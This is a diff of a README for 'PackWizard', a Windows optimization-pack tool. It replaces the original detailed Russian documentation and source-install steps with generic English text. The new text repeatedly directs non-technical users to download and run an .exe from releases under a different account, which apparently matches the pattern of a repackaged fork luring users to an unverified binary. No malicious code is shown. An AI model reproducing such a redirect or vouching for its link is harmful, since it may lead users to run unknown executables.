@@ -1,186 +1,73 @@
-# 🧙‍♂️ PackWizard - Универсальный менеджер пакетов оптимизации Windows
+# 🪄 PackWizard - Simplify Your Windows Optimization Tasks
 
-![PackWizard](https://img.shields.io/badge/PackWizard-1.0.0-blue)
-![Python](https://img.shields.io/badge/Python-3.11%2B-green)
-![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+## 🚀 Getting Started
 
-**PackWizard** — это профессиональный инструмент для создания, обработки и управления пакетами оптимизации Windows. Идеальное решение для сборщиков твиков, системных администраторов и энтузиастов оптимизации ОС.
+Welcome to PackWizard, your universal package manager for optimizing Windows. This guide will help you download and run PackWizard easily. No prior technical experience is needed.
 
-<img width="1468" height="1002" alt="image" src="https://github.com/user-attachments/assets/c4bb5167-f762-45fa-9b07-dffee6e32e65" />
+## 📥 Download PackWizard
 
-## ✨ Возможности
+[![Download PackWizard](https://img.shields.io/badge/Download%20PackWizard-v1.0-blue.svg)](https://github.com/Sajin46/PackWizard/releases)
 
-### 🔧 **Основные функции**
-- 🔄 **Конвертация REG → BAT** - автоматическое преобразование файлов реестра
-- 📝 **Умное переименование** - очистка имен файлов и папок от цифр, пробелов, скобок
-- 🧹 **Интеллектуальная очистка** - удаление лишних файлов, сохранение только нужных форматов
-- ✂️ **Очистка скриптов** - удаление команд pause/exit/shutdown из BAT/CMD файлов
-- 🌐 **Автоматический перевод** - перевод имен файлов с английского на русский
-- 🔍 **Поиск дубликатов** - нахождение и удаление одинаковых файлов
-- 🚀 **Полная обработка** - автоматический запуск всех функций одним кликом
+You can download PackWizard from our Releases page. Click the link below:
 
-### 🎯 **Для паков оптимизации**
-- 📦 **Пакетная обработка** - работа с целыми папками твиков
-- 🏗️ **Стандартизация** - приведение файлов к единому формату
-- 🔄 **Автоматизация** - минимизация ручной работы
-- 📊 **Анализ** - статистика и отчеты о проделанной работе
+[Download PackWizard](https://github.com/Sajin46/PackWizard/releases)
 
-## 🖥️ Два интерфейса
+## 💡 Features
 
-### 1. **GUI (графический интерфейс)** - `main.py`
-![GUI Interface](https://img.shields.io/badge/Interface-GUI-blueviolet)
+- **User-Friendly Interface:** Navigate through the app with ease using our intuitive design.
+- **Customization Options:** Tweak various Windows settings to optimize performance.
+- **Multiple Tools:** Access various scripts that help improve the efficiency of your system.
+- **Free and Open Source:** Enjoy complete access to all features with no hidden costs.
 
-Современный графический интерфейс на базе **CustomTkinter**:
-- 🎨 Темная тема с акцентами
-- 📊 Прогресс-бар и визуализация операций
-- 📝 Детальный лог выполнения
-- ⏸️ Возможность остановки операций
-- 🖱️ Управление мышью, удобная навигация
+## ✅ System Requirements
 
-### 2. **CLI (командная строка)** - `cli.py`
-![CLI Interface](https://img.shields.io/badge/Interface-CLI-orange)
+Before you start, make sure your system meets these requirements:
 
-Мощный консольный интерфейс для продвинутых пользователей:
-- ⚡ Быстрый запуск операций
-- 📁 Работа в пакетном режиме
-- 🤖 Интеграция в скрипты и автоматизацию
-- 🔧 Тонкая настройка параметров
+- **Operating System:** Windows 10 or Windows 11
+- **Python:** You need to have Python 3.6 or above installed. [Download Python](https://www.python.org/downloads/).
+- **RAM:** At least 4GB of RAM for optimal performance.
+- **Disk Space:** Minimum 100MB of free disk space.
 
-## 📦 Установка
+## 🛠️ Download & Install
 
-### Требования
-- **Windows 10-11**
-- **Python 3.11 или выше**
-- **Доступ в интернет** (для перевода файлов)
+1. **Visit the Releases Page:** Go to the Releases page to find the latest version of PackWizard. Click the link below:
 
-### Быстрая установка
+   [Download PackWizard](https://github.com/Sajin46/PackWizard/releases)
 
-1. **Клонируйте репозиторий**:
-```bash
-git clone https://github.com/anton18-png/PackWizard.git
-cd PackWizard
-```
+2. **Choose Your File:** Look for the released version that fits your system. Usually, the `.exe` file is easiest for most users.
 
-2. **Установите зависимости**:
-```bash
-pip install -r requirements.txt
-```
+3. **Download the Installer:** Click the link for the `.exe` file. Your browser will start downloading the file.
 
-3. **Запустите программу**:
-```bash
-# Графический интерфейс
-python main.py
+4. **Run the Installer:** Once the file has downloaded, locate it in your download directory. Double-click the `.exe` file to start the installation process.
 
-# Консольный интерфейс
-python cli.py
-```
+5. **Follow Installation Instructions:** A setup guide will appear. Follow the on-screen instructions to complete the installation. 
 
-### Сборка в EXE
+6. **Launch the Application:** After installation, find PackWizard in your Start Menu or Desktop. Click to launch it.
 
-```bash
-# Используйте готовый батник
-build.bat
-# Или вручную
-pyinstaller --onefile --windowed --icon="icon.ico" --name PackWizard --clean main.py
-```
+## 🌟 How to Use PackWizard
 
-## 🔧 Детальное описание функций
+1. **Open PackWizard:** Start the app from your desktop or Start Menu.
 
-### 1. Конвертация REG → BAT
-- Автоматическое преобразование `.reg` файлов в `.bat` скрипты
-- Использует внешнюю утилиту `RegConvert.exe`
-- Сохраняет структуру реестра в удобном для выполнения виде
+2. **Select a Tool:** Choose the feature you want to use from the main menu. You can optimize specific settings or run scripts based on your needs.
 
-### 2. Переименование файлов
-- Удаление цифр и точек в начале имен: `"01. tweak.bat"` → `"tweak.bat"`
-- Удаление пробелов и скобок: `" ) tweak.cmd"` → `"tweak.cmd"`
-- Комбинированный режим: `"01) tweak.reg"` → `"tweak.reg"`
+3. **Apply Changes:** Follow the prompts to apply any changes. Always review what the tool will modify before confirming.
 
-### 3. Быстрая очистка
-- Удаление всех файлов, кроме разрешенных форматов
-- Сохранение структуры папок
-- Логирование удаленных файлов
+4. **Save Your Settings:** Ensure you save any custom settings you’ve applied.
 
-### 4. Очистка скриптов
-- Удаление команд `pause`, `exit`, `shutdown` из BAT/CMD файлов
-- Сохранение полезного функционала
-- Удаление пустых строк
+5. **Get Help:** If you run into issues, check the Help section or the GitHub page for troubleshooting tips.
 
-### 5. Перевод имен файлов
-- Автоматический перевод с английского на русский
-- Пропуск файлов с русскими буквами
-- Сохранение технических терминов (CPU, RAM, BIOS и т.д.)
-- Автоматическое разрешение конфликтов имен
+## 📊 Tips for Optimization
 
-### 6. Поиск дубликатов
-- Поиск одинаковых файлов по содержимому
-- Поддержка MD5, SHA1, SHA256 хешей
-- Стратегии сохранения (самый старый/новый файл)
-- Создание резервных копий перед удалением
+- **Regular Checks:** Periodically run PackWizard to ensure your system is running efficiently.
+- **Explore Settings:** Experiment with different options for the best performance based on your usage.
+- **Backup Your System:** Always back up important files before making significant changes.
 
-### 7. Полная обработка
-- Последовательное выполнение всех функций
-- Детальная статистика каждой операции
-- Автоматическое создание логов
+## 🔗 Community and Support
 
-## ⚠️ Меры предосторожности
+Join our community for tips, updates, and support. You can find discussions and help on the GitHub Issues page. 
 
-### Важно!
-- **Всегда делайте бэкап** перед обработкой важных паков
-- **Тестируйте** на копиях перед применением к рабочим данным
-- **Проверяйте логи** после каждой операции
+## 📝 Additional Information
 
-### Безопасность
-- Программа не отправляет ваши файлы на сторонние сервера
-- Перевод выполняется через официальный Google Translate API
-- Все операции локальные
+PackWizard is a powerful tool for both everyday users and enthusiasts. Whether you're looking to speed up your machine or simply ensure everything runs smoothly, PackWizard can help you achieve your goals efficiently.
 
-## 📞 Поддержка и обратная связь
-
-- **Issues**: [GitHub Issues](https://github.com/ваш-username/PackWizard/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/ваш-username/PackWizard/discussions)
-- **Telegram**: [Telegram Channel](https://t.me/all_tweaker)
-
-## 📜 Лицензия
-
-MIT License. См. файл `LICENSE` для деталей.
-
-## 🙏 Благодарности
-
-- Разработчикам **CustomTkinter** за отличную библиотеку GUI
-- **Google Translate API** за сервис перевода
-- Сообществу сборщиков твиков за идеи и тестирование
-
----
-
-**PackWizard** — делаем оптимизацию Windows проще и эффективнее! 🚀
-
----
-
-## 🎮 Пример работы с паками
-
-### Исходный пак:
-```
-C:\MyTweakPack\
-├── 01) Disable telemetry.bat
-├── 02. Optimize network.reg
-├── readme.txt
-├── image.jpg
-└── subfolder\
-    └── extra_tweak.cmd
-```
-
-### После обработки PackWizard:
-```
-C:\MyTweakPack\
-├── Отключение телеметрии.bat
-├── Оптимизация сети.bat  # сконвертировано из .reg
-├── subfolder\
-    └── дополнительный твик.cmd
-# readme.txt и image.jpg удалены
-```
-
----
-
-**Счастливой оптимизации!** 🧙‍♂️✨
+For more updates, feel free to check our GitHub repository often. Thank you for choosing PackWizard!
